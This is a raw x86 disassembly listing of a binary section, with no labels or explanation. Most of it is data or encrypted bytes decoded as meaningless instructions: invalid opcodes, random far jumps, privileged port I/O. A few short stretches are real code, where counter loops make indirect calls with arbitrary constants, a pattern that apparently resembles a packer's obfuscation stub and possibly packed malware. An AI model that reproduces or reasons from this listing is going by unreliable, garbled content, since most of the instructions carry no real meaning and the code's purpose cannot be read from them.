  40af80:	cmp    al,0x6f
  40af82:	les    ebx,FWORD PTR [edi-0x74]
  40af85:	retf   0x5580
  40af88:	aam    0xcc
  40af8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af8b:	cmp    bl,BYTE PTR [ecx]
  40af8d:	cld    
  40af8e:	or     BYTE PTR [ebx-0x1aa83a8a],ah
  40af94:	adc    bl,ch
  40af96:	sti    
  40af97:	adc    eax,0x39471934
  40af9c:	outs   dx,BYTE PTR ds:[esi]
  40af9d:	stos   DWORD PTR es:[edi],eax
  40af9e:	inc    ebx
  40af9f:	cmp    eax,0x39891e31
  40afa4:	shr    DWORD PTR [esi+0x2c],0x46
  40afa8:	sub    BYTE PTR [edx-0x78],bh
  40afab:	aam    0x27
  40afad:	leave  
  40afae:	aaa    
  40afaf:	cmp    BYTE PTR [edi+0x7b],dh
  40afb2:	ins    BYTE PTR es:[edi],dx
  40afb3:	test   bh,dl
  40afb5:	cmp    dl,BYTE PTR [eax-0x65]
  40afb8:	and    eax,0xe9e8dd20
  40afbd:	out    dx,al
  40afbe:	mov    eax,0xb59ec665
  40afc3:	add    al,0x1c
  40afc5:	push   ebp
  40afc6:	popa   
  40afc7:	ret    
  40afc8:	add    BYTE PTR [edi],dl
  40afca:	adc    DWORD PTR [eax+0x17],0x407529e3
  40afd1:	push   eax
  40afd2:	inc    edi
  40afd3:	jle    0x40afef
  40afd5:	dec    eax
  40afd6:	inc    ebp
  40afd7:	mov    ecx,0xff021816
  40afdc:	ficom  WORD PTR [esi+0x6095f9a4]
  40afe2:	mov    ds:0x2141ad6d,eax
  40afe7:	nop
  40afe8:	cli    
  40afe9:	jle    0x40afaf
  40afeb:	dec    edx
  40afec:	into   
  40afed:	sub    eax,0x939a2e7a
  40aff2:	inc    ecx
  40aff3:	test   eax,0xd4971bc
  40aff8:	mov    es,WORD PTR [esi+edx*1]
  40affb:	fnstcw WORD PTR [edx-0x1d827b68]
  40b001:	retf   0xe63a
  40b004:	test   al,0xfe
  40b006:	ja     0x40b023
  40b008:	in     al,dx
  40b009:	push   ebp
  40b00a:	push   ebx
  40b00b:	jge    0x40b068
  40b00d:	inc    edi
  40b00e:	lahf   
  40b00f:	xor    BYTE PTR [edx-0x3b11c93d],0xa7
  40b016:	(bad)  
  40b017:	push   ds
  40b018:	add    ecx,DWORD PTR [edx+0x43]
  40b01b:	sub    dh,BYTE PTR [edi+0x7c]
  40b01e:	or     al,0x6a
  40b020:	or     DWORD PTR [eax],edi
  40b022:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b023:	dec    ebx
  40b024:	(bad)  
  40b025:	cmp    DWORD PTR [esi],esi
  40b027:	pop    edx
  40b028:	pop    ss
  40b029:	stc    
  40b02a:	dec    ebp
  40b02b:	or     bl,cl
  40b02d:	sub    BYTE PTR [edx+0x773f5198],cl
  40b033:	(bad)  
  40b034:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b035:	iret   
  40b036:	mov    ds:0xa05c7dc,al
  40b03b:	cmp    al,0x15
  40b03d:	into   
  40b03e:	sbb    dh,al
  40b040:	sub    al,0x38
  40b042:	cmp    ebp,DWORD PTR ds:[eax-0x11e5c0d8]
  40b049:	pop    ebx
  40b04a:	vpmacswd ymm15,ymm4,YMMWORD PTR [ecx+r8d*8],ymm2
  40b051:	pusha  
  40b052:	popa   
  40b053:	ret    
  40b054:	mov    esp,0x16a1ad95
  40b059:	ss cs daa 
  40b05c:	scas   eax,DWORD PTR es:[edi]
  40b05d:	push   edx
  40b05e:	add    DWORD PTR [edi-0x7],edi
  40b061:	add    al,0xea
  40b063:	sub    edi,DWORD PTR [edx+edx*8]
  40b066:	fst    QWORD PTR [ebp-0x32e24e14]
  40b06c:	retf   
  40b06d:	jno    0x40b038
  40b06f:	out    dx,al
  40b070:	pop    ecx
  40b071:	cmp    BYTE PTR [ecx-0x40],ch
  40b074:	arpl   WORD PTR [ecx],ax
  40b076:	rol    DWORD PTR [edx+0x2],0x99
  40b07a:	push   esi
  40b07b:	lahf   
  40b07c:	mov    esp,0x21456ba2
  40b081:	lea    edx,[esi+0x5fe37799]
  40b087:	sub    ah,al
  40b089:	aas    
  40b08a:	xor    DWORD PTR ds:0x143fe407,edi
  40b090:	cmp    al,ah
  40b092:	cli    
  40b093:	mov    cl,0xaf
  40b095:	ret    0x429
  40b098:	cmp    eax,0x33a0c4ff
  40b09d:	ret    0xf233
  40b0a0:	add    eax,ecx
  40b0a2:	add    esi,ecx
  40b0a4:	imul   eax,esi
  40b0a7:	mov    esi,DWORD PTR [ebp+0xc]
  40b0aa:	cmp    esi,eax
  40b0ac:	mov    eax,DWORD PTR [ebp-0x4]
  40b0af:	je     0x40aa89
  40b0b5:	xor    eax,edx
  40b0b7:	add    eax,ecx
  40b0b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40b0bc:	imul   eax,ecx
  40b0bf:	add    eax,DWORD PTR [ebp+0x8]
  40b0c2:	mov    DWORD PTR [ebp+0xc],eax
  40b0c5:	mov    eax,DWORD PTR [ebp+0xc]
  40b0c8:	jmp    0x40b2c3
  40b0cd:	fadd   QWORD PTR [edi-0x18]
  40b0d0:	(bad)  
  40b0d1:	ins    DWORD PTR es:[edi],dx
  40b0d2:	jns    0x40b0d0
  40b0d4:	pop    ebp
  40b0d5:	xchg   BYTE PTR [ebx+0xb],cl
  40b0d8:	xor    dl,BYTE PTR [ebx-0x62fe6f00]
  40b0de:	loop   0x40b15e
  40b0e0:	jle    0x40b13e
  40b0e2:	jg     0x40b162
  40b0e4:	jle    0x40b111
  40b0e6:	fstp   DWORD PTR [edx+0x6e9a2a55]
  40b0ec:	pop    ebx
  40b0ed:	nop
  40b0ee:	add    DWORD PTR [ecx-0x2b70bc60],esi
  40b0f4:	push   ebx
  40b0f5:	lock push esp
  40b0f7:	enter  0x5627,0x12
  40b0fb:	sbb    eax,DWORD PTR [eax-0x4027c2a5]
  40b101:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b102:	lds    esi,FWORD PTR [eax-0x4fb4d4f5]
  40b108:	inc    esi
  40b109:	imul   eax,DWORD PTR [esi+0x28f94e78],0xffffff80
  40b110:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b111:	ins    DWORD PTR es:[edi],dx
  40b112:	iret   
  40b113:	sub    al,0x24
  40b115:	icebp  
  40b116:	jbe    0x40b130
  40b118:	jbe    0x40b16c
  40b11a:	push   edx
  40b11b:	ficomp DWORD PTR [esi+0x69]
  40b11e:	pop    esi
  40b11f:	and    eax,0x131969d9
  40b124:	jecxz  0x40b0bf
  40b126:	adc    al,0x5e
  40b128:	ret    0xc1b3
  40b12b:	xchg   ecx,eax
  40b12c:	inc    eax
  40b12d:	inc    eax
  40b12e:	inc    esi
  40b12f:	das    
  40b130:	into   
  40b131:	fdivr  st(6),st
  40b133:	mov    eax,ds:0xf390cf49
  40b138:	adc    BYTE PTR [eax+0x6d0783b0],ch
  40b13e:	jl     0x40b153
  40b140:	das    
  40b141:	mov    edi,0x23cfa1a1
  40b146:	jmp    0x40b0e9
  40b148:	cmp    bl,BYTE PTR [esi+0x1a]
  40b14b:	stos   DWORD PTR es:[edi],eax
  40b14c:	outs   dx,BYTE PTR ds:[esi]
  40b14d:	fld    DWORD PTR [edx]
  40b14f:	sbb    al,0x9a
  40b151:	xchg   DWORD PTR [edi+eiz*2],ebx
  40b154:	scas   eax,DWORD PTR es:[edi]
  40b155:	shl    BYTE PTR [ebp-0xc46a94c],0x11
  40b15c:	lods   al,BYTE PTR ds:[esi]
  40b15d:	cmp    BYTE PTR [ebp+0x2d],al
  40b160:	inc    esp
  40b161:	mov    edx,0x976013af
  40b166:	fs or  eax,0x8402148d
  40b16c:	gs cmc 
  40b16e:	arpl   WORD PTR [edx],bx
  40b170:	inc    eax
  40b171:	push   0x16bdb3d7
  40b176:	jne    0x40b157
  40b178:	cmp    DWORD PTR [edx+0x43],eax
  40b17b:	inc    ebp
  40b17c:	jns    0x40b14b
  40b17e:	mov    al,0xff
  40b180:	les    esp,FWORD PTR [ebp+0x1e63526]
  40b186:	jb     0x40b190
  40b188:	xor    ecx,ecx
  40b18a:	and    eax,0xa4670b32
  40b18f:	xor    eax,DWORD PTR [edi+eax*1+0x54]
  40b193:	inc    DWORD PTR [ebp+ebp*2+0x6b]
  40b197:	cmc    
  40b198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b199:	pop    edi
  40b19a:	jns    0x40b19b
  40b19c:	mov    ecx,0x4022a787
  40b1a1:	push   edi
  40b1a2:	es or  al,0x7c
  40b1a5:	jns    0x40b1ce
  40b1a7:	mov    bl,0xcb
  40b1a9:	dec    ecx
  40b1aa:	imul   edi,ebp,0x98257099
  40b1b0:	xchg   ebx,eax
  40b1b1:	cmp    ebp,DWORD PTR [ebp-0x1afa6596]
  40b1b7:	shl    esi,cl
  40b1b9:	cmc    
  40b1ba:	ins    BYTE PTR es:[edi],dx
  40b1bb:	retf   
  40b1bc:	sub    BYTE PTR [edx-0x39],dl
  40b1bf:	cli    
  40b1c0:	cmp    al,0xd4
  40b1c2:	sbb    dl,cl
  40b1c4:	pusha  
  40b1c5:	scas   eax,DWORD PTR es:[edi]
  40b1c6:	fist   WORD PTR [esi]
  40b1c8:	fcomp  DWORD PTR [ebp-0x2d]
  40b1cb:	imul   esp,DWORD PTR [edx+0x273e8a31],0x39
  40b1d2:	and    esp,DWORD PTR [ecx-0x41]
  40b1d5:	mov    ?,WORD PTR [edx]
  40b1d7:	jle    0x40b1e6
  40b1d9:	cmp    esp,esp
  40b1db:	(bad)  
  40b1dd:	cmp    DWORD PTR [eax-0x38a7bae7],ebp
  40b1e3:	inc    ebp
  40b1e4:	adc    al,0x2e
  40b1e6:	and    DWORD PTR [edi],eax
  40b1e8:	pop    eax
  40b1e9:	push   es
  40b1ea:	jne    0x40b25d
  40b1ec:	or     ch,ch
  40b1ee:	fist   WORD PTR [ebp-0x37]
  40b1f1:	lock xchg ebx,eax
  40b1f3:	fcmovbe st,st(6)
  40b1f5:	mov    al,0x55
  40b1f7:	xchg   edi,eax
  40b1f8:	inc    ebx
  40b1f9:	push   edx
  40b1fa:	adc    eax,0x2ff8f122
  40b1ff:	push   ebp
  40b200:	lahf   
  40b201:	cdq    
  40b202:	cmp    dl,ah
  40b204:	clc    
  40b205:	dec    eax
  40b206:	lods   eax,DWORD PTR ds:[esi]
  40b207:	in     eax,dx
  40b208:	sbb    DWORD PTR [ebx+0x21c58f08],eax
  40b20e:	add    DWORD PTR [esi],edx
  40b210:	int3   
  40b211:	sbb    eax,0x932c3b80
  40b216:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b217:	fisttp WORD PTR [edi]
  40b219:	and    DWORD PTR [edx+ecx*4],ecx
  40b21c:	and    eax,0x3b5559c2
  40b221:	sbb    ebp,DWORD PTR [ebx+0x33]
  40b224:	mov    cl,0x14
  40b226:	sbb    BYTE PTR [ebp+0xb3145ae],bl
  40b22c:	pop    esi
  40b22d:	jne    0x40b204
  40b22f:	fsubr  st,st(4)
  40b231:	adc    eax,0xbd8b09c9
  40b236:	sar    DWORD PTR [eax-0x9f2a420],1
  40b23c:	repz cs mov eax,0x5283aeb2
  40b243:	sbb    ebx,edi
  40b245:	xchg   ebx,eax
  40b246:	xor    bl,dh
  40b248:	or     bh,BYTE PTR [esi-0x47eda2c4]
  40b24e:	xor    DWORD PTR gs:[ebx+esi*1+0x10],ebp
  40b253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b254:	xchg   ebp,eax
  40b255:	repnz shr DWORD PTR [esi-0x6656aef5],cl
  40b25c:	inc    ecx
  40b25e:	in     al,dx
  40b25f:	mov    bh,0x5c
  40b261:	popa   
  40b262:	pop    edx
  40b263:	inc    eax
  40b264:	dec    esi
  40b265:	stc    
  40b266:	ss popf 
  40b268:	fstp   TBYTE PTR [edi+0x1]
  40b26b:	push   edi
  40b26c:	out    dx,eax
  40b26d:	pop    ecx
  40b26e:	mov    ds:0xd184e521,al
  40b273:	aas    
  40b274:	sbb    dl,BYTE PTR [edx]
  40b276:	lods   eax,DWORD PTR ds:[esi]
  40b277:	outs   dx,BYTE PTR ds:[esi]
  40b278:	xor    eax,0x2ce12366
  40b27d:	mov    ebp,esi
  40b27f:	dec    ebx
  40b280:	(bad)  [ebx]
  40b282:	test   eax,0xdd78136f
  40b287:	dec    edi
  40b288:	dec    esi
  40b289:	inc    ecx
  40b28a:	shl    al,0x10
  40b28d:	dec    ebx
  40b28e:	sub    bl,BYTE PTR cs:[edx-0x4a5138b3]
  40b295:	addr16 mov esp,0xed57b67d
  40b29b:	and    BYTE PTR [edx+edx*2+0xbf11119],0x63
  40b2a3:	xchg   ebp,eax
  40b2a4:	or     al,0x3b
  40b2a6:	into   
  40b2a7:	dec    esi
  40b2a8:	mov    fs,WORD PTR [esi+0x4c]
  40b2ab:	and    BYTE PTR [eax],ah
  40b2ad:	pop    esp
  40b2ae:	or     BYTE PTR ss:[esi-0x7b],ah
  40b2b2:	adc    al,0xce
  40b2b4:	xchg   esi,eax
  40b2b5:	mov    edx,0xe0f86414
  40b2ba:	mov    es,WORD PTR [ecx+0x120393f5]
  40b2c0:	cmp    DWORD PTR [eax],ecx
  40b2c2:	mov    bh,0x5e
  40b2c4:	leave  
  40b2c5:	ret    0x8
  40b2c8:	push   ebp
  40b2c9:	mov    ebp,esp
  40b2cb:	sub    esp,0x30
  40b2ce:	mov    eax,ds:0x43056e
  40b2d3:	mov    ecx,DWORD PTR ds:0x43057a
  40b2d9:	sub    ecx,eax
  40b2db:	imul   eax,DWORD PTR [eax+ecx*1]
  40b2df:	jmp    0x40b43d
  40b2e4:	adc    eax,0x6533e552
  40b2e9:	inc    ebp
  40b2ea:	and    eax,0x241ce54
  40b2ef:	scas   al,BYTE PTR es:[edi]
  40b2f0:	aad    0xca
  40b2f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2f3:	sar    ebx,1
  40b2f5:	in     al,0x7e
  40b2f7:	jle    0x40b338
  40b2f9:	jg     0x40b379
  40b2fb:	jle    0x40b347
  40b2fd:	jl     0x40b335
  40b2ff:	mov    eax,0x8cc16afc
  40b304:	enter  0xd349,0x85
  40b308:	xchg   BYTE PTR [eax],dh
  40b30a:	fild   DWORD PTR [esi-0x20]
  40b30d:	xchg   esi,eax
  40b30e:	mov    bh,0x53
  40b310:	pop    ds
  40b311:	sub    DWORD PTR [ecx],ebx
  40b313:	outs   dx,BYTE PTR ds:[esi]
  40b314:	cs inc edi
  40b316:	scas   eax,DWORD PTR es:[edi]
  40b317:	outs   dx,BYTE PTR ds:[esi]
  40b318:	jmp    0x40b2bf
  40b31a:	retf   0xaeef
  40b31d:	push   ds
  40b31e:	(bad)  
  40b31f:	dec    esp
  40b320:	xchg   esi,eax
  40b321:	test   DWORD PTR [ebp+0x7116784f],0x1a3ec4ae
  40b32b:	dec    ebp
  40b32c:	and    al,0xfe
  40b32e:	fidivr WORD PTR [eax]
  40b330:	push   cs
  40b331:	cld    
  40b332:	aad    0x10
  40b334:	imul   esi,DWORD PTR [ebp-0x2b2617f3],0x24
  40b33b:	cs sub bh,0x9
  40b33f:	xor    DWORD PTR [ebp+0x3d],eax
  40b342:	xchg   ch,dl
  40b344:	jp     0x40b3a1
  40b346:	mov    eax,edi
  40b348:	pop    es
  40b349:	adc    BYTE PTR ds:0x7c660d8a,bh
  40b34f:	xchg   edi,eax
  40b350:	mov    eax,0x3c69329a
  40b355:	inc    eax
  40b356:	inc    ebp
  40b357:	fadd   st,st(6)
  40b359:	stos   BYTE PTR es:[edi],al
  40b35a:	mov    WORD PTR [ecx+0x5579b8ae],?
  40b360:	cmp    al,0x49
  40b362:	ret    0x32df
  40b365:	and    DWORD PTR [esi+0x6ec910b1],ebp
  40b36b:	adc    ah,dh
  40b36d:	dec    ecx
  40b36e:	adc    eax,0x26748e14
  40b373:	cld    
  40b374:	mul    BYTE PTR [edi]
  40b376:	push   ecx
  40b377:	jg     0x40b3f0
  40b379:	sbb    esp,edx
  40b37b:	pushf  
  40b37c:	shl    DWORD PTR [eax+0x4f],1
  40b37f:	jecxz  0x40b3a4
  40b381:	add    ecx,DWORD PTR [edx]
  40b383:	push   ebx
  40b384:	push   cs
  40b385:	push   ss
  40b386:	and    al,0xb3
  40b388:	xchg   DWORD PTR [ebx],esi
  40b38a:	mov    al,0x82
  40b38c:	cs fyl2xp1 
  40b38f:	xor    ebx,ebx
  40b391:	fwait
  40b392:	inc    ebx
  40b393:	gs adc edx,ebx
  40b396:	xor    eax,0x38e4927
  40b39b:	dec    ebx
  40b39c:	out    0xa6,eax
  40b39e:	jb     0x40b412
  40b3a0:	lock enter 0xc0ba,0xe9
  40b3a5:	pop    ebx
  40b3a6:	retf   0xdcd3
  40b3a9:	sub    al,0xbc
  40b3ab:	out    dx,al
  40b3ac:	shl    DWORD PTR [edx],0x29
  40b3af:	test   DWORD PTR [edx+0x223297e],edi
  40b3b5:	push   ebx
  40b3b6:	lds    esp,FWORD PTR [ecx-0x3e0c0249]
  40b3bc:	mov    ch,BYTE PTR [esi]
  40b3be:	push   0xffffffa1
  40b3c0:	adc    eax,0x8e12bd99
  40b3c5:	mov    DWORD PTR [ebx-0x7ead6110],eax
  40b3cb:	pop    edx
  40b3cc:	shl    BYTE PTR [esi-0x51],1
  40b3cf:	ins    BYTE PTR es:[edi],dx
  40b3d0:	nop
  40b3d1:	or     bl,BYTE PTR [ecx-0x45]
  40b3d4:	inc    esp
  40b3d5:	inc    edi
  40b3d6:	jmp    0x9d9b:0x3b7f0a39
  40b3dd:	or     BYTE PTR [edx+ebp*2+0x6b058c84],dl
  40b3e4:	xor    BYTE PTR [ebp-0x465369ba],bl
  40b3ea:	jecxz  0x40b379
  40b3ec:	adc    al,BYTE PTR [ecx+0x5f0fe240]
  40b3f2:	pop    eax
  40b3f3:	iret   
  40b3f4:	jmp    0x40b448
  40b3f6:	retf   
  40b3f7:	iret   
  40b3f8:	std    
  40b3f9:	sub    DWORD PTR [edx],0x68903b1c
  40b3ff:	push   eax
  40b400:	adc    DWORD PTR [edx*4+0x63fe161e],eax
  40b407:	adc    al,0xa6
  40b409:	test   DWORD PTR [ebx],0x65915c57
  40b40f:	pop    esp
  40b410:	(bad)  
  40b411:	mov    edi,0x7018f93c
  40b416:	or     DWORD PTR [ebx],ebx
  40b418:	adc    eax,0xec8a484a
  40b41d:	stos   DWORD PTR es:[edi],eax
  40b41e:	push   es
  40b41f:	adc    eax,0xe920e9ac
  40b424:	out    dx,eax
  40b425:	pop    ds
  40b426:	iret   
  40b427:	ja     0x40b454
  40b429:	rcl    BYTE PTR [eax],1
  40b42b:	adc    DWORD PTR [esi-0x31],ebp
  40b42e:	stos   BYTE PTR es:[edi],al
  40b42f:	ins    DWORD PTR es:[edi],dx
  40b430:	test   DWORD PTR [esi+eiz*4],eax
  40b433:	in     eax,0xd3
  40b435:	aad    0x3e
  40b437:	dec    esp
  40b438:	push   0x691258d
  40b43d:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40b444:	mov    DWORD PTR ds:0x43054e,0x11
  40b44e:	cmp    DWORD PTR ds:0x43054e,0x0
  40b455:	je     0x40b489
  40b45b:	cmp    DWORD PTR ds:0x43054e,0x19
  40b462:	jne    0x40b479
  40b468:	push   DWORD PTR [ebp-0x24]
  40b46b:	push   DWORD PTR [ebp-0x20]
  40b46e:	push   0x41ff
  40b473:	call   DWORD PTR ds:0x42eae8
  40b479:	mov    eax,ds:0x43054e
  40b47e:	dec    eax
  40b47f:	mov    ds:0x43054e,eax
  40b484:	jmp    0x40b44e
  40b489:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40b490:	or     eax,0x1c5c
  40b495:	mov    ecx,DWORD PTR [ebp-0x4]
  40b498:	push   ebx
  40b499:	add    DWORD PTR ds:0x4304ae,edi
  40b49f:	mov    eax,0x7510856
  40b4a4:	mov    ebx,DWORD PTR ds:0x430542
  40b4aa:	sbb    DWORD PTR ds:0x42e762,ebx
  40b4b0:	xor    ecx,eax
  40b4b2:	mov    ebx,DWORD PTR ds:0x42ee14
  40b4b8:	sub    DWORD PTR ds:0x43048e,ebx
  40b4be:	mov    ebx,0x32729d
  40b4c3:	xor    DWORD PTR ds:0x430546,0xece
  40b4cd:	add    ecx,ebx
  40b4cf:	xor    DWORD PTR ds:0x430496,0x42e76a
  40b4d9:	mov    DWORD PTR [ebp-0x1c],ecx
  40b4dc:	mov    ecx,DWORD PTR [ebp+0x14]
  40b4df:	xor    DWORD PTR ds:0x42ee1c,0x65f3
  40b4e9:	push   esi
  40b4ea:	sub    DWORD PTR ds:0x42e762,0x2022
  40b4f4:	push   edi
  40b4f5:	and    DWORD PTR ds:0x430546,0x430492
  40b4ff:	test   ecx,ecx
  40b501:	mov    DWORD PTR ds:0x42e75e,0x17b6
  40b50b:	je     0x40b58a
  40b511:	add    ecx,0x2345
  40b517:	mov    ecx,DWORD PTR [ebp+0x14]
  40b51a:	and    DWORD PTR ds:0x4304a6,0x0
  40b524:	jmp    0x40b536
  40b529:	mov    edi,DWORD PTR ds:0x4304a6
  40b52f:	inc    edi
  40b530:	mov    DWORD PTR ds:0x4304a6,edi
  40b536:	cmp    DWORD PTR ds:0x4304a6,0x1d
  40b53d:	jae    0x40b585
  40b543:	cmp    DWORD PTR ds:0x4304a6,0x4
  40b54a:	jne    0x40b560
  40b550:	push   0x42ee1c
  40b555:	push   0x6d9e
  40b55a:	call   DWORD PTR ds:0x42eaec
  40b560:	cmp    DWORD PTR ds:0x4304a6,0x3
  40b567:	jne    0x40b57a
  40b56d:	mov    edi,DWORD PTR ds:0x4304a6
  40b573:	inc    edi
  40b574:	mov    DWORD PTR ds:0x4304a6,edi
  40b57a:	jmp    0x40b529
  40b57f:	and    esi,0x3dcd
  40b585:	mov    ecx,DWORD PTR [ecx]
  40b587:	mov    DWORD PTR [ebp-0x1c],ecx
  40b58a:	movzx  esi,BYTE PTR ds:0x430492
  40b591:	xor    DWORD PTR ds:0x4304ba,esi
  40b597:	imul   edx,eax
  40b59a:	or     DWORD PTR ds:0x4304be,edx
  40b5a0:	mov    ecx,0x4573
  40b5a5:	xor    esi,DWORD PTR ds:0x430486
  40b5ab:	add    edx,ecx
  40b5ad:	mov    esi,0x7879
  40b5b2:	and    DWORD PTR ds:0x43053e,0x0
  40b5bc:	mov    edi,DWORD PTR ds:0x43053e
  40b5c2:	inc    edi
  40b5c3:	mov    DWORD PTR ds:0x43053e,edi
  40b5c9:	cmp    DWORD PTR ds:0x43053e,0x12
  40b5d0:	jne    0x40b5f7
  40b5d6:	push   0x1
  40b5d8:	push   0x3333
  40b5dd:	push   0x7164
  40b5e2:	push   0x26d7
  40b5e7:	push   0x1d14
  40b5ec:	push   0x64d6
  40b5f1:	call   DWORD PTR ds:0x42eaf0
  40b5f7:	cmp    DWORD PTR ds:0x43053e,0x11
  40b5fe:	jne    0x40b613
  40b604:	xor    edi,edi
  40b606:	or     edi,DWORD PTR ds:0x43053e
  40b60c:	inc    edi
  40b60d:	mov    DWORD PTR ds:0x43053e,edi
  40b613:	cmp    DWORD PTR ds:0x43053e,0x1f
  40b61a:	jb     0x40b5bc
  40b620:	dec    edi
  40b621:	mov    edi,0x1556
  40b626:	xchg   esi,ecx
  40b628:	sub    edx,edi
  40b62a:	xor    esi,esi
  40b62c:	jmp    0x40b78a
  40b631:	mov    ch,dh
  40b633:	add    esi,DWORD PTR [eax+0x7b]
  40b636:	aad    0x9d
  40b638:	jl     0x40b646
  40b63a:	mov    eax,0xc5b4dc4
  40b63f:	jmp    0x40b6a9
  40b641:	mov    esp,0x3f7e7ee5
  40b646:	jg     0x40b6c6
  40b648:	jle    0x40b6b7
  40b64a:	adc    bl,BYTE PTR [edx+0x7a]
  40b64d:	lds    edx,FWORD PTR [ebx+0x77]
  40b650:	add    dl,ah
  40b652:	outs   dx,BYTE PTR ds:[esi]
  40b653:	stc    
  40b654:	or     BYTE PTR [ecx+0x1b],dl
  40b657:	push   ebx
  40b658:	repz leave 
  40b65a:	out    dx,eax
  40b65b:	mov    DWORD PTR [edi+0x5e041528],edi
  40b661:	(bad)  
  40b662:	aas    
  40b663:	xor    DWORD PTR [edx+0x31],edi
  40b666:	test   DWORD PTR [ecx-0x3b5cf2dc],esp
  40b66c:	sub    al,0xb8
  40b66e:	mov    al,0x40
  40b670:	ret    
  40b671:	dec    edx
  40b672:	shr    ebx,0xa0
  40b675:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b676:	mov    DWORD PTR [ebp+0x46],esp
  40b679:	mov    DWORD PTR [edi+0x3e4082eb],esp
  40b67f:	and    DWORD PTR [eax+0x1d8e50d2],esi
  40b685:	sub    bl,dh
  40b687:	int    0x82
  40b689:	icebp  
  40b68a:	aas    
  40b68b:	pusha  
  40b68c:	test   eax,0xa1b4b419
  40b691:	jle    0x40b6dc
  40b693:	arpl   WORD PTR [ebp+ebp*8-0x3ad77ab2],bx
  40b69a:	mov    ebx,0x9f76ad00
  40b69f:	sahf   
  40b6a0:	int3   
  40b6a1:	mov    ecx,0xedbb1384
  40b6a6:	ds mov esp,0x6526c3e6
  40b6ac:	dec    ebp
  40b6ad:	pop    eax
  40b6ae:	jbe    0x40b717
  40b6b0:	pop    es
  40b6b1:	adc    eax,0x87b27a39
  40b6b6:	inc    edx
  40b6b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6b8:	dec    ecx
  40b6b9:	mov    esi,0xd8183f85
  40b6be:	mov    BYTE PTR [ebp+0x6cdb6a70],ch
  40b6c4:	push   ebp
  40b6c5:	dec    esp
  40b6c6:	sub    esp,DWORD PTR ds:0x452eeb69
  40b6cc:	pmullw mm0,QWORD PTR [ebx+0x45]
  40b6d0:	js     0x40b6e7
  40b6d2:	adc    ebp,DWORD PTR [esi+edi*2+0x51]
  40b6d6:	pop    esp
  40b6d7:	in     al,0x44
  40b6d9:	aaa    
  40b6da:	cmp    ch,BYTE PTR [ecx+ebx*4+0x21]
  40b6de:	test   ebx,ecx
  40b6e0:	mov    bl,0x8c
  40b6e2:	push   es
  40b6e3:	mov    ebp,0xa0b7093a
  40b6e8:	lock jbe 0x40b716
  40b6eb:	cmp    al,0xe9
  40b6ed:	(bad)  [esi]
  40b6ef:	jg     0x40b74b
  40b6f1:	arpl   ax,di
  40b6f3:	idiv   BYTE PTR cs:[eax-0x655c97bb]
  40b6fa:	mov    ds:0xa24384fe,al
  40b6ff:	inc    esi
  40b700:	das    
  40b701:	push   es
  40b702:	adc    BYTE PTR [ebx+0x30c5dc54],cl
  40b708:	xchg   esi,eax
  40b709:	ins    DWORD PTR es:[edi],dx
  40b70a:	mov    al,0xf1
  40b70c:	(bad)  
  40b70d:	(bad)  
  40b70e:	clc    
  40b70f:	test   BYTE PTR [esi+0x7b],0x79
  40b713:	add    BYTE PTR [edi],bl
  40b715:	or     bl,BYTE PTR [eax-0x5d3de397]
  40b71b:	int    0x5e
  40b71d:	sub    al,0x13
  40b71f:	mov    bh,0xc6
  40b721:	adc    cl,BYTE PTR [ebx]
  40b723:	xchg   edi,eax
  40b724:	sub    esi,0xc0f451ed
  40b72a:	jg     0x40b71d
  40b72c:	das    
  40b72d:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40b72f:	or     BYTE PTR [eax],dh
  40b731:	pop    ecx
  40b732:	in     al,dx
  40b733:	jmp    0xd86d:0x8614587
  40b73a:	(bad)  
  40b73b:	sbb    eax,0x519af4f3
  40b740:	add    al,0xba
  40b742:	sbb    DWORD PTR [ebp+0x5f456490],ecx
  40b748:	mov    dl,BYTE PTR [ebx+0x621db917]
  40b74e:	loop   0x40b7a0
  40b750:	dec    DWORD PTR [ecx+0xfaf7203]
  40b756:	mov    al,ds:0x2e36c841
  40b75b:	xor    DWORD PTR [ecx-0x7d14f88e],0x44532bd2
  40b765:	push   edx
  40b767:	jmp    0x2dcf:0x7adc3a46
  40b76e:	mov    esi,0xe8c4d37c
  40b773:	jmp    0xb0fa7d44
  40b778:	(bad)  
  40b77a:	xchg   BYTE PTR [esi],dl
  40b77c:	push   esi
  40b77d:	out    0x7b,al
  40b77f:	xor    DWORD PTR [ecx+0x4f00b6f1],0x48
  40b786:	push   esp
  40b787:	cs retf 
  40b789:	test   BYTE PTR [ecx+0x1d21d875],0xb2
  40b790:	add    al,0x43
  40b792:	add    BYTE PTR [ecx+0xd0bd475],cl
  40b798:	inc    edx
  40b799:	add    eax,0x59e90043
  40b79e:	add    DWORD PTR [eax],eax
  40b7a0:	add    BYTE PTR [ebp+0x47],ah
  40b7a3:	xor    eax,0x657cedde
  40b7a8:	pop    ebp
  40b7a9:	xchg   edx,eax
  40b7aa:	lods   al,BYTE PTR ds:[esi]
  40b7ab:	mov    al,ds:0xed5bc397
  40b7b0:	inc    ebp
  40b7b1:	jge    0x40b799
  40b7b3:	jle    0x40b833
  40b7b5:	aas    
  40b7b6:	jg     0x40b836
  40b7b8:	jle    0x40b749
  40b7ba:	inc    ebp
  40b7bb:	hlt    
  40b7bc:	mov    edx,ebx
  40b7be:	lahf   
  40b7bf:	js     0x40b7e3
  40b7c1:	enter  0x5835,0xb8
  40b7c5:	mov    edx,0xf05442cf
  40b7ca:	in     eax,dx
  40b7cb:	sbb    al,0x11
  40b7cd:	sub    eax,0xc2ecfdf3
  40b7d2:	retf   
  40b7d3:	cmp    esi,DWORD PTR [esi]
  40b7d5:	adc    eax,edx
  40b7d7:	xor    ah,BYTE PTR [ecx+0x526ce897]
  40b7dd:	fiadd  DWORD PTR [ecx+0x20]
  40b7e0:	sti    
  40b7e1:	push   ds
